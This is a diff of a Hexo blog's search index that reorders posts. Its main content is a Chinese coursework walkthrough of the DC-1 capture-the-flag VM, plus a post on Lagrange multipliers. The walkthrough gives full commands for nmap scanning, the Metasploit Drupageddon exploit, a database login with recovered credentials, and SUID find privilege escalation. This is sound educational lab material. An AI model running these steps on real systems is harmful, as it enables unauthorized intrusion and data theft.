@@ -124,85 +124,6 @@
       </categories>
   </entry>
   <entry>
-    <title>攻防夺旗DC1</title>
-    <url>/2019/09/11/hacker-2/</url>
-    <content><![CDATA[<p>软件综合训练第二天….<a id="more"></a></p>
-<h3 id="1-扫描被攻击主机ip地址："><a href="#1-扫描被攻击主机ip地址：" class="headerlink" title="1. 扫描被攻击主机ip地址："></a>1. <strong>扫描被攻击主机ip地址</strong>：</h3><p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">nmap -sn 192.168.73.0/24</span><br></pre></td></tr></table></figure></p>
-<p><img src="/2019/09/11/hacker-2/1.png" alt="1.png"></p>
-<p>从结果发现，共有五台在线主机，IP末尾为.1、.2和.254位虚拟机VMware自带，而kali_linux的IP为192.168.73.131，因此我们要攻击的主机的ip为192.168.73.130。</p>
-<p>###2. <strong>获取更多信息</strong>：</p>
-<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">nmap -Pn -sSV -A  -p- -T5 192.168.73.130</span><br></pre></td></tr></table></figure></p>
-<p>-Pn为了不同ping，因为知道主机已启动，-p-扫描所有端口，-sC用默认脚本，-sSV发现开放端口然后尝试使用bannergrabbing服务名称和版本信息，-A运行大量nmap脚本来识别操作系统并收集更多信息，比较激进，-T5用于扫描更快。-T3是nmap默认值，在此下可用于避免网络上的IDS（他们会延迟扫描）。ip地址段为kali_linxu所属网段。</p>
-<p><img src="/2019/09/11/hacker-2/2.png" alt="2.png"></p>
-<p>可以从结果看出，该服务器是一个web服务器，因为它开放了80端口，并且使用了Drupal的CMS进行搭建的网站。因此我们可以考虑利用Drupal的漏洞进行攻击，但是利用nmap仅仅只能得到其版本为7，不能更加精确，因此我们需要确定他更加具体的版本号。</p>
-<p>###3. <strong>进一步扫描，确定drupal版本：</strong></p>
-<p>安装并使用droopescan对drupal 进行扫描：</p>
-<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">git <span class="hljs-built_in">clone</span> https://github.com/droope/droopescan.git</span><br><span class="line"><span class="hljs-built_in">cd</span> droopescan</span><br><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure></p>
-<p>使用方法：</p>
-<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">./droopescan scan drupal -u dc1.com</span><br></pre></td></tr></table></figure></p>
-<p>比如现在我们要攻击的主机为192.168.73.130，则具体命令为：</p>
-<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">./droopescan scan drupal -u 192.168.73.130</span><br></pre></td></tr></table></figure></p>
-<p>扫描结果如下：</p>
-<p><img src="/2019/09/11/hacker-2/3.png" alt="3.png"></p>
-<p>由结果我们发现，该网站所使用的drupal版本可能为7.22～7.26，因此存在Drupageddon漏洞</p>
-<p>（Drupageddon是Drupal版本7.32中暴露的漏洞。它允许远程代码执行和shell访问）</p>
-<h3 id="4-利用Drupageddon"><a href="#4-利用Drupageddon" class="headerlink" title="4. 利用Drupageddon"></a>4. <strong>利用Drupageddon</strong></h3><p>msf中已经内置该漏洞脚本，可以直接在msf中查找</p>
-<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">msf &gt; search Drupal</span><br></pre></td></tr></table></figure></p>
-<p><img src="/2019/09/11/hacker-2/4.png" alt="4.png"></p>
-<p>接下来就是要利用该脚本进行攻击了，攻击方法如下（在msfconsole下）：</p>
-<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">use exploit/multi/http/drupal_drupageddon</span><br><span class="line"><span class="hljs-built_in">set</span> rhost 192.168.73.130</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></p>
-<p>rhost参数为被攻击的主机ip地址。</p>
-<p><img src="/2019/09/11/hacker-2/5.png" alt="5.png"></p>
-<p>这样我们就获得了这个网站的控制权了，但却不是root用户，我们可以输入以下命令发现我们并没有获得全部的权限：</p>
-<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure></p>
-<p><img src="/2019/09/11/hacker-2/6.png" alt="6.png"></p>
-<p>我们可以看到通过<code>whoami</code>命令得到的并不是root用户。</p>
-<h3 id="5-Get-Flag1"><a href="#5-Get-Flag1" class="headerlink" title="5. Get Flag1 !"></a>5. <strong>Get Flag1 !</strong></h3><p>当我们获取到了被攻击主机的网站控制权后，我们可以试一试<code>ls</code>命令，发现该目录下有一个flag1.txt，我们找到了一个旗子！让我们打开来看看里面有什么提示呢！</p>
-<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; cat flag1.txt</span><br></pre></td></tr></table></figure></p>
-<p>注意：一定要在meterpreter &gt; 提示符下，如果你跟着我的上一步输入了<code>shell</code>，那请先输入exit退出到<code>meterpreter &gt;</code></p>
-<p><img src="/2019/09/11/hacker-2/7.png" alt="7.png"></p>
-<p>我们可以看到第一条提示：Every good CMS needs a config file - and so do you.</p>
-<p>提示配置文件，谷歌得知在在sites/default/settings.php下。</p>
-<p>让我们打开配置文件看看都有什么内容呢…</p>
-<p><img src="/2019/09/11/hacker-2/8.png" alt="8.png"></p>
-<p>可以看到在第一行写着：flag2</p>
-<p>Brute force and dictionary attacks aren’t the</p>
-<ul>
-<li>only ways to gain access (and you WILL need access).</li>
-<li>What can you do with these credentials?</li>
-</ul>
-<p>同时获得数据库用户名密码（dbuser/R0ck3t)</p>
-<p>接下来让我们进入数据库，试着找找有没有下一个flag，进入数据库命令如下：</p>
-<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line">python -c <span class="hljs-string">'import pty; pty.spawn("/bin/bash")'</span></span><br><span class="line">mysql -u dbuser -p</span><br></pre></td></tr></table></figure></p>
-<p>之后要求你输入密码，密码上面已经得到了：R0ck3t</p>
-<p>之后输入：</p>
-<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">use drupaldb;</span><br><span class="line">select * from users;</span><br></pre></td></tr></table></figure></p>
-<p>这样就得到了加密后的admin密码，下面我们需要把数据库dump下来。</p>
-<h3 id="6-把数据库dump下来："><a href="#6-把数据库dump下来：" class="headerlink" title="6. 把数据库dump下来："></a>6. <strong>把数据库dump下来：</strong></h3><p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">mysqldump -u dbuser -p drupaldb &gt; 1.sql</span><br></pre></td></tr></table></figure></p>
-<p>使用ls命令可以看到当前目录下存在1.sql文件。</p>
-<p><img src="/2019/09/11/hacker-2/9.png" alt="9.png"></p>
-<p>使用cat命令打开1.sql查找flag3，可以发现存在提示：search_dataset:flag3 special perms will help find the passwd but you ll need to exec that command to work out how to get what s in the shadow</p>
-<p>两个提示：一个find，一个passwd</p>
-<h3 id="7-根据提示，寻找其余flag"><a href="#7-根据提示，寻找其余flag" class="headerlink" title="7. 根据提示，寻找其余flag"></a>7. <strong>根据提示，寻找其余flag</strong></h3><p>因为passwd为配置文件，位于/etc/passwd，因此我们cd到/etc目录下查看passwd文件内容：</p>
-<p><img src="/2019/09/11/hacker-2/10.png" alt="10.png"></p>
-<p>我们可以发现passwd文件内容最后一行存在一个用户名为flag4，我们于是cd到flag4的用户目录/home/flag4下查看。</p>
-<p><img src="/2019/09/11/hacker-2/11.png" alt="11.png"></p>
-<p>我们发现该用户目录下有一个flag4.txt，于是我们继续用cat命令查看该文件内容。</p>
-<p><img src="/2019/09/11/hacker-2/12.png" alt="12.png"></p>
-<p>这个提示告诉我们最后一个flag在root目录下，我们可以利用和find相似的方法去寻找。</p>
-<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">find /root</span><br></pre></td></tr></table></figure></p>
-<p><img src="/2019/09/11/hacker-2/13.png" alt="13.png"></p>
-<p>可以看到在/root目录下有最后一个flag，即thefinalflag.txt，但是我们并没有root用户权限，怎么才能查看到这个文件内容呢？</p>
-<p>我们可以利用find进行提权，直接使用以下命令：</p>
-<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">find /root/thefinalflag.txt -<span class="hljs-built_in">type</span> f -<span class="hljs-built_in">exec</span> cat <span class="hljs-string">'&#123;&#125;'</span> \;</span><br></pre></td></tr></table></figure></p>
-<p><img src="/2019/09/11/hacker-2/14.png" alt="14.png"></p>
-<p>好了，我们终于成功了！嘿嘿嘿！</p>
-]]></content>
-      <categories>
-        <category>软件综合训练课程</category>
-      </categories>
-  </entry>
-  <entry>
     <title>DC4</title>
     <url>/2019/09/17/hacker-3/</url>
     <content><![CDATA[<p>软件综合训练-续<a id="more"></a></p>
@@ -310,6 +231,85 @@
       </categories>
   </entry>
   <entry>
+    <title>攻防夺旗DC1</title>
+    <url>/2019/09/11/hacker-2/</url>
+    <content><![CDATA[<p>软件综合训练第二天….<a id="more"></a></p>
+<h3 id="1-扫描被攻击主机ip地址："><a href="#1-扫描被攻击主机ip地址：" class="headerlink" title="1. 扫描被攻击主机ip地址："></a>1. <strong>扫描被攻击主机ip地址</strong>：</h3><p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">nmap -sn 192.168.73.0/24</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2019/09/11/hacker-2/1.png" alt="1.png"></p>
+<p>从结果发现，共有五台在线主机，IP末尾为.1、.2和.254位虚拟机VMware自带，而kali_linux的IP为192.168.73.131，因此我们要攻击的主机的ip为192.168.73.130。</p>
+<p>###2. <strong>获取更多信息</strong>：</p>
+<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">nmap -Pn -sSV -A  -p- -T5 192.168.73.130</span><br></pre></td></tr></table></figure></p>
+<p>-Pn为了不同ping，因为知道主机已启动，-p-扫描所有端口，-sC用默认脚本，-sSV发现开放端口然后尝试使用bannergrabbing服务名称和版本信息，-A运行大量nmap脚本来识别操作系统并收集更多信息，比较激进，-T5用于扫描更快。-T3是nmap默认值，在此下可用于避免网络上的IDS（他们会延迟扫描）。ip地址段为kali_linxu所属网段。</p>
+<p><img src="/2019/09/11/hacker-2/2.png" alt="2.png"></p>
+<p>可以从结果看出，该服务器是一个web服务器，因为它开放了80端口，并且使用了Drupal的CMS进行搭建的网站。因此我们可以考虑利用Drupal的漏洞进行攻击，但是利用nmap仅仅只能得到其版本为7，不能更加精确，因此我们需要确定他更加具体的版本号。</p>
+<p>###3. <strong>进一步扫描，确定drupal版本：</strong></p>
+<p>安装并使用droopescan对drupal 进行扫描：</p>
+<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">git <span class="hljs-built_in">clone</span> https://github.com/droope/droopescan.git</span><br><span class="line"><span class="hljs-built_in">cd</span> droopescan</span><br><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure></p>
+<p>使用方法：</p>
+<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">./droopescan scan drupal -u dc1.com</span><br></pre></td></tr></table></figure></p>
+<p>比如现在我们要攻击的主机为192.168.73.130，则具体命令为：</p>
+<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">./droopescan scan drupal -u 192.168.73.130</span><br></pre></td></tr></table></figure></p>
+<p>扫描结果如下：</p>
+<p><img src="/2019/09/11/hacker-2/3.png" alt="3.png"></p>
+<p>由结果我们发现，该网站所使用的drupal版本可能为7.22～7.26，因此存在Drupageddon漏洞</p>
+<p>（Drupageddon是Drupal版本7.32中暴露的漏洞。它允许远程代码执行和shell访问）</p>
+<h3 id="4-利用Drupageddon"><a href="#4-利用Drupageddon" class="headerlink" title="4. 利用Drupageddon"></a>4. <strong>利用Drupageddon</strong></h3><p>msf中已经内置该漏洞脚本，可以直接在msf中查找</p>
+<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">msf &gt; search Drupal</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2019/09/11/hacker-2/4.png" alt="4.png"></p>
+<p>接下来就是要利用该脚本进行攻击了，攻击方法如下（在msfconsole下）：</p>
+<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">use exploit/multi/http/drupal_drupageddon</span><br><span class="line"><span class="hljs-built_in">set</span> rhost 192.168.73.130</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></p>
+<p>rhost参数为被攻击的主机ip地址。</p>
+<p><img src="/2019/09/11/hacker-2/5.png" alt="5.png"></p>
+<p>这样我们就获得了这个网站的控制权了，但却不是root用户，我们可以输入以下命令发现我们并没有获得全部的权限：</p>
+<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2019/09/11/hacker-2/6.png" alt="6.png"></p>
+<p>我们可以看到通过<code>whoami</code>命令得到的并不是root用户。</p>
+<h3 id="5-Get-Flag1"><a href="#5-Get-Flag1" class="headerlink" title="5. Get Flag1 !"></a>5. <strong>Get Flag1 !</strong></h3><p>当我们获取到了被攻击主机的网站控制权后，我们可以试一试<code>ls</code>命令，发现该目录下有一个flag1.txt，我们找到了一个旗子！让我们打开来看看里面有什么提示呢！</p>
+<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; cat flag1.txt</span><br></pre></td></tr></table></figure></p>
+<p>注意：一定要在meterpreter &gt; 提示符下，如果你跟着我的上一步输入了<code>shell</code>，那请先输入exit退出到<code>meterpreter &gt;</code></p>
+<p><img src="/2019/09/11/hacker-2/7.png" alt="7.png"></p>
+<p>我们可以看到第一条提示：Every good CMS needs a config file - and so do you.</p>
+<p>提示配置文件，谷歌得知在在sites/default/settings.php下。</p>
+<p>让我们打开配置文件看看都有什么内容呢…</p>
+<p><img src="/2019/09/11/hacker-2/8.png" alt="8.png"></p>
+<p>可以看到在第一行写着：flag2</p>
+<p>Brute force and dictionary attacks aren’t the</p>
+<ul>
+<li>only ways to gain access (and you WILL need access).</li>
+<li>What can you do with these credentials?</li>
+</ul>
+<p>同时获得数据库用户名密码（dbuser/R0ck3t)</p>
+<p>接下来让我们进入数据库，试着找找有没有下一个flag，进入数据库命令如下：</p>
+<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line">python -c <span class="hljs-string">'import pty; pty.spawn("/bin/bash")'</span></span><br><span class="line">mysql -u dbuser -p</span><br></pre></td></tr></table></figure></p>
+<p>之后要求你输入密码，密码上面已经得到了：R0ck3t</p>
+<p>之后输入：</p>
+<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">use drupaldb;</span><br><span class="line">select * from users;</span><br></pre></td></tr></table></figure></p>
+<p>这样就得到了加密后的admin密码，下面我们需要把数据库dump下来。</p>
+<h3 id="6-把数据库dump下来："><a href="#6-把数据库dump下来：" class="headerlink" title="6. 把数据库dump下来："></a>6. <strong>把数据库dump下来：</strong></h3><p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">mysqldump -u dbuser -p drupaldb &gt; 1.sql</span><br></pre></td></tr></table></figure></p>
+<p>使用ls命令可以看到当前目录下存在1.sql文件。</p>
+<p><img src="/2019/09/11/hacker-2/9.png" alt="9.png"></p>
+<p>使用cat命令打开1.sql查找flag3，可以发现存在提示：search_dataset:flag3 special perms will help find the passwd but you ll need to exec that command to work out how to get what s in the shadow</p>
+<p>两个提示：一个find，一个passwd</p>
+<h3 id="7-根据提示，寻找其余flag"><a href="#7-根据提示，寻找其余flag" class="headerlink" title="7. 根据提示，寻找其余flag"></a>7. <strong>根据提示，寻找其余flag</strong></h3><p>因为passwd为配置文件，位于/etc/passwd，因此我们cd到/etc目录下查看passwd文件内容：</p>
+<p><img src="/2019/09/11/hacker-2/10.png" alt="10.png"></p>
+<p>我们可以发现passwd文件内容最后一行存在一个用户名为flag4，我们于是cd到flag4的用户目录/home/flag4下查看。</p>
+<p><img src="/2019/09/11/hacker-2/11.png" alt="11.png"></p>
+<p>我们发现该用户目录下有一个flag4.txt，于是我们继续用cat命令查看该文件内容。</p>
+<p><img src="/2019/09/11/hacker-2/12.png" alt="12.png"></p>
+<p>这个提示告诉我们最后一个flag在root目录下，我们可以利用和find相似的方法去寻找。</p>
+<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">find /root</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2019/09/11/hacker-2/13.png" alt="13.png"></p>
+<p>可以看到在/root目录下有最后一个flag，即thefinalflag.txt，但是我们并没有root用户权限，怎么才能查看到这个文件内容呢？</p>
+<p>我们可以利用find进行提权，直接使用以下命令：</p>
+<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">find /root/thefinalflag.txt -<span class="hljs-built_in">type</span> f -<span class="hljs-built_in">exec</span> cat <span class="hljs-string">'&#123;&#125;'</span> \;</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2019/09/11/hacker-2/14.png" alt="14.png"></p>
+<p>好了，我们终于成功了！嘿嘿嘿！</p>
+]]></content>
+      <categories>
+        <category>软件综合训练课程</category>
+      </categories>
+  </entry>
+  <entry>
     <title>XSS结合Beef的社会工程学窃取密码实验</title>
     <url>/2019/09/18/hacker-4/</url>
     <content><![CDATA[<p>软件综合训练-终结篇<a id="more"></a></p>
@@ -374,6 +374,20 @@
 ]]></content>
       <categories>
         <category>软件综合训练课程</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>拉格朗日乘数法</title>
+    <url>/2019/12/09/langrange-multi-approach/</url>
+    <content><![CDATA[<p>在看摘要的文章中突然发现拉格朗日乘数法这个名词，觉得很熟悉但不记得具体是什么了，简单记录以备遗忘。<a id="more"></a><br>看了wiki百科后，发现原来这个用来优化的方法在大二的一门课————《最优化方法》上学过，怪不得很熟悉，而且这貌似也是大一工数的知识…大四的小废物全部忘光了，该查缺补漏继续学习了…</p>
+<h3 id="一、简介-from-wiki"><a href="#一、简介-from-wiki" class="headerlink" title="一、简介(from wiki)"></a>一、简介(<em>from wiki</em>)</h3><p>在数学中的最优化问题中，拉格朗日乘数法（以数学家约瑟夫·拉格朗日命名）是一种寻找多元函数在其变量受到一个或多个条件的约束时的极值的方法。这种方法可以将一个有<strong>n</strong>个变量与<strong>k</strong>个约束条件的最优化问题转换为一个解有<strong>n + k</strong>个变量的方程组的解的问题。这种方法中引入了一个或一组新的未知数，即拉格朗日乘数，又称拉格朗日乘子，或拉氏乘子，它们是在转换后的方程，即约束方程中作为梯度（gradient）的线性组合中各个向量的系数。<br>比如，要求$f(x,y)$在$g(x,y) = c$时的最大值时，我们可以引入新变量拉格朗日乘数$\lambda$，这时我们只需要下列拉格朗日函数的极值：$\mathcal{L}(x,y,\lambda)=f(x,y)+\lambda \cdot {\Big (}g(x,y)-c{\Big )}$<br>更一般的，对含有n个变量和k个约束的情况，有：<br>$\mathcal{L}(x_{1},\ldots,x_{n},\lambda_{1},\ldots,\lambda_{k}) = f(x_{1},\ldots ,x_{n})-\sum \limits_{i=1}^{k}\lambda_{i}g_{i}(x_{1},\ldots,x_{n})$，<br><strong>拉格朗日乘数法所得的极点会包含原问题的所有极值点，但并不保证每个极值点都是原问题的极值点。</strong>拉格朗日乘数法的正确性的证明牵涉到偏微分，全微分或链法。</p>
+<h3 id="二、证明"><a href="#二、证明" class="headerlink" title="二、证明"></a>二、证明</h3><p>设函数$f(x,y)$在$A$处有极值$\kappa$,且在点$A$的邻域内连续。则在点$A$处有：<br>$f(x,y) = \kappa$<br>另有一常值函数<br>$g(x,y) = c$<br>两函数在$A$点处的全微分为:<br>$\mathrm{d}f=\dfrac{\partial{f}}{\partial{x}}\mathrm{d}x + \dfrac{\partial{f}}{\partial{y}}\mathrm{d}y = 0$<br>$\mathrm{d}g=\dfrac{\partial{g}}{\partial{x}}\mathrm{d}x + \dfrac{\partial{g}}{\partial{y}}\mathrm{d}y = 0$<br>由于齐次方程有非零解，也就是点$A$，所以该齐次方程的行列式为0，因此该线性方程组的系数成比例，有：<br>$\dfrac {\dfrac {\partial {f}}{\partial {x}}} {\dfrac {\partial {g}}{\partial {x}}} = \dfrac {\dfrac {\partial {f}}{\partial {y}}} {\dfrac {\partial {g}}{\partial {y}}} = -\lambda$<br>即：<br>$\dfrac{\partial{f}}{\partial{x}} + \lambda \dfrac{\partial{g}}{\partial{x}} = 0$</p>
+<p>$\dfrac{\partial{f}}{\partial{y}} + \lambda \dfrac{\partial{g}}{\partial{y}} = 0$<br>将上二式分别乘以$\mathrm{d}x$和$\mathrm{d}y$，再相加并积分，得到一新函数<br>$\mathcal{L}(x,y,\lambda) = f(x,y) + \lambda \cdot g(x,y)$<br>那么，求原函数极值的问题就转化为求该函数极值的问题。<br>类似地，这种求极值的方法也可以推广到多维函数$f(x_{1},\ldots,x_{n})$</p>
+<h3 id="三、举例"><a href="#三、举例" class="headerlink" title="三、举例"></a>三、举例</h3><p>给定椭球：$ \dfrac{x^2}{a^2} + \dfrac{y^2}{b^2} + \dfrac{z^2}{c^2} = 1$，求这椭球的内接最大长方体的体积。<br>这个问题实际上就是条件极值问题，即在条件$ \dfrac{x^2}{a^2} + \dfrac{y^2}{b^2} + \dfrac{z^2}{c^2} = 1$下，求$f(x,y,z) = 8xyz$的最大值。这个问题当然可以用消元法解决，但我们在这里用的是拉格朗日乘数法。<br>首先定义拉格朗日函数$\mathcal{L}(x,y,z,\lambda) = 8xyz + \lambda \cdot (\dfrac{x^2}{a^2} + \dfrac{y^2}{b^2} + \dfrac{z^2}{c^2} - 1)$<br>之后解变量的偏导方程，对$\mathcal{L}(x,y,z,\lambda)$求偏导得：<br>$\dfrac {\partial{\mathcal{L}(x,y,z,\lambda)}} {\partial{x}} = 8yz + \dfrac {2 \lambda x}{a^2} = 0$<br>$\dfrac {\partial{\mathcal{L}(x,y,z,\lambda)}} {\partial{y}} = 8xz + \dfrac {2 \lambda y}{b^2} = 0$<br>$\dfrac {\partial{\mathcal{L}(x,y,z,\lambda)}} {\partial{z}} = 8xy + \dfrac {2 \lambda z}{c^2} = 0$<br>$\dfrac {\partial{\mathcal{L}(x,y,z,\lambda)}} {\partial{\lambda}} = \dfrac{x^2}{a^2} + \dfrac{y^2}{b^2} + \dfrac{z^2}{c^2} - 1 = 0$<br>联立前面三个方程得到$bx = ay$和$az = cx$，带入第四个方程解得：<br>$x = \dfrac{\sqrt{3}}{3}a$  $y = \dfrac{\sqrt{3}}{3}b$  $z = \dfrac{\sqrt{3}}{3}c$<br>带入解得内接长方体的最大体积为：$V_{max} = f(\dfrac{\sqrt{3}}{3}a,\dfrac{\sqrt{3}}{3}b,\dfrac{\sqrt{3}}{3}c) = \dfrac{8\sqrt{3}}{9}abc$</p>
+<h3 id="四、其他"><a href="#四、其他" class="headerlink" title="四、其他"></a>四、其他</h3><p>维基百科上的这幅图画的很直观，特转自于此<br><img src="/2019/12/09/langrange-multi-approach/Lagrange_multiplier.png" alt="1.png"><br><strong>另外，拉格朗日乘数法只能求极值，不能精确到极小值或极大值（像求导求极值一样），所以要代入试验。</strong></p>
+]]></content>
+      <categories>
+        <category>Daily Essays</category>
       </categories>
   </entry>
   <entry>
@@ -443,20 +457,6 @@
 <p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">lsmod | grep bbr</span><br></pre></td></tr></table></figure></p>
 <p>如果出现<img src="/2019/06/29/ipv6/7.png" alt></p>
 <p>则开启成功！<br>现在开启我们的科学上网之旅吧！</p>
-]]></content>
-      <categories>
-        <category>Daily Essays</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>拉格朗日乘数法</title>
-    <url>/2019/12/09/langrange-multi-approach/</url>
-    <content><![CDATA[<p>在看摘要的文章中突然发现拉格朗日乘数法这个名词，觉得很熟悉但不记得具体是什么了，简单记录以备遗忘。<a id="more"></a><br>看了wiki百科后，发现原来这个用来优化的方法在大二的一门课————《最优化方法》上学过，怪不得很熟悉，而且这貌似也是大一工数的知识…大四的小废物全部忘光了，该查缺补漏继续学习了…</p>
-<h3 id="一、简介-from-wiki"><a href="#一、简介-from-wiki" class="headerlink" title="一、简介(from wiki)"></a>一、简介(<em>from wiki</em>)</h3><p>在数学中的最优化问题中，拉格朗日乘数法（以数学家约瑟夫·拉格朗日命名）是一种寻找多元函数在其变量受到一个或多个条件的约束时的极值的方法。这种方法可以将一个有<strong>n</strong>个变量与<strong>k</strong>个约束条件的最优化问题转换为一个解有<strong>n + k</strong>个变量的方程组的解的问题。这种方法中引入了一个或一组新的未知数，即拉格朗日乘数，又称拉格朗日乘子，或拉氏乘子，它们是在转换后的方程，即约束方程中作为梯度（gradient）的线性组合中各个向量的系数。<br>比如，要求$f(x,y)$在$g(x,y) = c$时的最大值时，我们可以引入新变量拉格朗日乘数$\lambda$，这时我们只需要下列拉格朗日函数的极值：$\mathcal{L}(x,y,\lambda)=f(x,y)+\lambda \cdot {\Big (}g(x,y)-c{\Big )}$<br>更一般的，对含有n个变量和k个约束的情况，有：<br>$\mathcal{L}(x_{1},\ldots,x_{n},\lambda_{1},\ldots,\lambda_{k}) = f(x_{1},\ldots ,x_{n})-\sum \limits_{i=1}^{k}\lambda_{i}g_{i}(x_{1},\ldots,x_{n})$，<br><strong>拉格朗日乘数法所得的极点会包含原问题的所有极值点，但并不保证每个极值点都是原问题的极值点。</strong>拉格朗日乘数法的正确性的证明牵涉到偏微分，全微分或链法。</p>
-<h3 id="二、证明"><a href="#二、证明" class="headerlink" title="二、证明"></a>二、证明</h3><p>设函数$f(x,y)$在$A$处有极值$\kappa$,且在点$A$的邻域内连续。则在点$A$处有：<br>$f(x,y) = \kappa$<br>另有一常值函数<br>$g(x,y) = c$<br>两函数在$A$点处的全微分为:<br>$\mathrm{d}f=\dfrac{\partial{f}}{\partial{x}}\mathrm{d}x + \dfrac{\partial{f}}{\partial{y}}\mathrm{d}y = 0$<br>$\mathrm{d}g=\dfrac{\partial{g}}{\partial{x}}\mathrm{d}x + \dfrac{\partial{g}}{\partial{y}}\mathrm{d}y = 0$<br>由于齐次方程有非零解，也就是点$A$，所以该齐次方程的行列式为0，因此该线性方程组的系数成比例，有：<br>$\dfrac {\dfrac {\partial {f}}{\partial {x}}} {\dfrac {\partial {g}}{\partial {x}}} = \dfrac {\dfrac {\partial {f}}{\partial {y}}} {\dfrac {\partial {g}}{\partial {y}}} = -\lambda$<br>即：<br>$\dfrac{\partial{f}}{\partial{x}} + \lambda \dfrac{\partial{g}}{\partial{x}} = 0$</p>
-<p>$\dfrac{\partial{f}}{\partial{y}} + \lambda \dfrac{\partial{g}}{\partial{y}} = 0$<br>将上二式分别乘以$\mathrm{d}x$和$\mathrm{d}y$，再相加并积分，得到一新函数<br>$\mathcal{L}(x,y,\lambda) = f(x,y) + \lambda \cdot g(x,y)$<br>那么，求原函数极值的问题就转化为求该函数极值的问题。<br>类似地，这种求极值的方法也可以推广到多维函数$f(x_{1},\ldots,x_{n})$</p>
-<h3 id="三、举例"><a href="#三、举例" class="headerlink" title="三、举例"></a>三、举例</h3><p>给定椭球：$ \dfrac{x^2}{a^2} + \dfrac{y^2}{b^2} + \dfrac{z^2}{c^2} = 1$，求这椭球的内接最大长方体的体积。<br>这个问题实际上就是条件极值问题，即在条件$ \dfrac{x^2}{a^2} + \dfrac{y^2}{b^2} + \dfrac{z^2}{c^2} = 1$下，求$f(x,y,z) = 8xyz$的最大值。这个问题当然可以用消元法解决，但我们在这里用的是拉格朗日乘数法。<br>首先定义拉格朗日函数$\mathcal{L}(x,y,z,\lambda) = 8xyz + \lambda \cdot (\dfrac{x^2}{a^2} + \dfrac{y^2}{b^2} + \dfrac{z^2}{c^2} - 1)$<br>之后解变量的偏导方程，对$\mathcal{L}(x,y,z,\lambda)$求偏导得：<br>$\dfrac {\partial{\mathcal{L}(x,y,z,\lambda)}} {\partial{x}} = 8yz + \dfrac {2 \lambda x}{a^2} = 0$<br>$\dfrac {\partial{\mathcal{L}(x,y,z,\lambda)}} {\partial{y}} = 8xz + \dfrac {2 \lambda y}{b^2} = 0$<br>$\dfrac {\partial{\mathcal{L}(x,y,z,\lambda)}} {\partial{z}} = 8xy + \dfrac {2 \lambda z}{c^2} = 0$<br>$\dfrac {\partial{\mathcal{L}(x,y,z,\lambda)}} {\partial{\lambda}} = \dfrac{x^2}{a^2} + \dfrac{y^2}{b^2} + \dfrac{z^2}{c^2} - 1 = 0$<br>联立前面三个方程得到$bx = ay$和$az = cx$，带入第四个方程解得：<br>$x = \dfrac{\sqrt{3}}{3}a$  $y = \dfrac{\sqrt{3}}{3}b$  $z = \dfrac{\sqrt{3}}{3}c$<br>带入解得内接长方体的最大体积为：$V_{max} = f(\dfrac{\sqrt{3}}{3}a,\dfrac{\sqrt{3}}{3}b,\dfrac{\sqrt{3}}{3}c) = \dfrac{8\sqrt{3}}{9}abc$</p>
-<h3 id="四、其他"><a href="#四、其他" class="headerlink" title="四、其他"></a>四、其他</h3><p>维基百科上的这幅图画的很直观，特转自于此<br><img src="/2019/12/09/langrange-multi-approach/Lagrange_multiplier.png" alt="1.png"><br><strong>另外，拉格朗日乘数法只能求极值，不能精确到极小值或极大值（像求导求极值一样），所以要代入试验。</strong></p>
 ]]></content>
       <categories>
         <category>Daily Essays</category>
@@ -770,21 +770,6 @@
       </categories>
   </entry>
   <entry>
-    <title>服务器配置jupyter notebook实现远程访问</title>
-    <url>/2019/12/14/remote-jupyternotebook/</url>
-    <content><![CDATA[<p><code>jupyter notebook</code>简单配置，随手记录，以备遗忘。<a id="more"></a><br>最近开始想从头系统的学习一下深度学习，以便为以后三年的研究生的学习生活打基础，顺便将之前租的阿里云服务器利用起来，于是就配置一下<code>jupyter notebook</code>吧</p>
-<h3 id="一、安装"><a href="#一、安装" class="headerlink" title="一、安装"></a>一、安装</h3><p><code>jupyter notebook</code>会随着<code>Anaconda</code>一起安装好，因此我们只需要安装好<code>Anaconda</code>就好，详情请参照之前的博客。</p>
